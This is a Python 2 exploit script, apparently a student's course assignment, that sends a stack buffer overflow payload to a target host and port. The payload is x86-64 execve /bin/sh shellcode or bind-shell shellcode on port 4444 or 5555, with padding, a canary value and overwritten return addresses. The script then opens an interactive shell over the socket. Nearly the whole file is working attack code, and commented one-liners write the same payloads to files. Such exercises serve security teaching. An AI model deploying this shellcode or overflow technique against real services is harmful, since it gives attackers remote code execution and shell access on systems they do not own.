#!/usr/bin/python

#Nicholas Villemez Assignment 2

import struct
import socket
import sys
import time
import binascii
import os
import math
import md5
import re
import hashlib
import telnetlib
import base64

alphanum = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'

def rnd_string(sz):
   res = ''
   for i in xrange(sz):
      res += alphanum[random.randrange(0, len(alphanum))]
   return res

def p(f, *args):
   return struct.pack(f, *args)

def u(f, v):
   return struct.unpack(f, v)

def hx(s):
   return binascii.hexlify(s)
   
def ux(s):
   return binascii.unhexlify(s)

def readUntil(s, content, echo = True):
   x = ""
   while True:
      y = s.recv(1)
      if not y:
         return False
      x += y
      for v in content:
         if x.endswith(v):
            if echo:
               sys.stderr.write(x)
            return x

def ru(s, txt):
   return readUntil(s, [txt])

def interact(s):
   t = telnetlib.Telnet()                                                            
   t.sock = s                                                                        
   t.interact() 

if len(sys.argv) != 3:
   print "usage: python prog.py <ip> <port>"
   sys.exit(0)

tgthost = sys.argv[1]
tgtport = int(sys.argv[2])

target = (tgthost, tgtport)

s = socket.socket()
s.connect(target)

shellcode = '\x48\x31\xc0\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\x50\x48\x89\xe2\x57\x48\x89\xe6\xb8\x3b\x00\x00\x00\x0f\x05'

# Use for port 4444
                                                                                      ######## Change to modify the target port, currently 4444
bind_shellcode = "\x48\x31\xd2\x6a\x01\x5e\x6a\x02\x5f\x6a\x29\x58\x0f\x05\xbb\x02\x02\x11\x5c\x30\xff\x53\x6a\x10\x5a\x48\x89\xe6\x48\x89\xc7\xb0\x31\x0f\x05\x89\xfe\xb0\x32\x0f\x05\x48\x89\xc2\x48\x89\xc6\xb0\x2b\x0f\x05\x48\x97\x6a\x02\x5e\x6a\x21\x58\x0f\x05\x48\xff\xce\x79\xf6\x48\x31\xc0\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\x50\x48\x89\xe2\x57\x48\x89\xe6\xb8\x3b\x00\x00\x00\x0f\x05"

# Use for port 5555
                                                                                      ######## Change to modify the target port, currently 5555
#bind_shellcode = "\x48\x31\xd2\x6a\x01\x5e\x6a\x02\x5f\x6a\x29\x58\x0f\x05\xbb\x02\x02\x15\xb3\x30\xff\x53\x6a\x10\x5a\x48\x89\xe6\x48\x89\xc7\xb0\x31\x0f\x05\x89\xfe\xb0\x32\x0f\x05\x48\x89\xc2\x48\x89\xc6\xb0\x2b\x0f\x05\x48\x97\x6a\x02\x5e\x6a\x21\x58\x0f\x05\x48\xff\xce\x79\xf6\x48\x31\xc0\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\x50\x48\x89\xe2\x57\x48\x89\xe6\xb8\x3b\x00\x00\x00\x0f\x05"

#DO THE FUN STUFF HERE
payload =  bind_shellcode + '\n' + '3' + '\n' + 'A'*244 + '\xfe\xca\xd0\xd0' + '\x1e\x0e\x40\x00\x00\x00\x00\x00' + 'A'*8 + '\x60\x32\x60\x00\x00\x00\x00\x00' + '\n'

# Add this line to test via command line echo ls>> payload33name.txt
#python payload Shellcode
#python -c "print('\x48\x31\xc0\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\x50\x48\x89\xe2\x57\x48\x89\xe6\xb8\x3b\x00\x00\x00\x0f\x05' + '\n' + '3' + '\n' + 'A'*244 + '\xfe\xca\xd0\xd0' + '\x1e\x0e\x40\x00\x00\x00\x00\x00' + 'A'*8 + '\x60\x32\x60\x00\x00\x00\x00\x00' + '\n')" > payload.txt

# Bind Shell
#python -c "print('\x48\x31\xd2\x6a\x01\x5e\x6a\x02\x5f\x6a\x29\x58\x0f\x05\xbb\x02\x02\x11\x5c\x30\xff\x53\x6a\x10\x5a\x48\x89\xe6\x48\x89\xc7\xb0\x31\x0f\x05\x89\xfe\xb0\x32\x0f\x05\x48\x89\xc2\x48\x89\xc6\xb0\x2b\x0f\x05\x48\x97\x6a\x02\x5e\x6a\x21\x58\x0f\x05\x48\xff\xce\x79\xf6\x48\x31\xc0\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\x50\x48\x89\xe2\x57\x48\x89\xe6\xb8\x3b\x00\x00\x00\x0f\x05' + '\n' + '3' + '\n' + 'A'*244 + '\xfe\xca\xd0\xd0' + '\x1e\x0e\x40\x00\x00\x00\x00\x00' + 'A'*8 + '\x60\x32\x60\x00\x00\x00\x00\x00' + '\n')" > bindpayload.txt

s.send(payload)

#build payload
#send payload
#repeat as necessary


# Once you have a shell on some socket s, maybe that's the
# same socket at above, maybe it's a new socket, then interact
# will use telnetlib to handle the asynchronous I/O needed to 
# interact with your shell

interact(s)
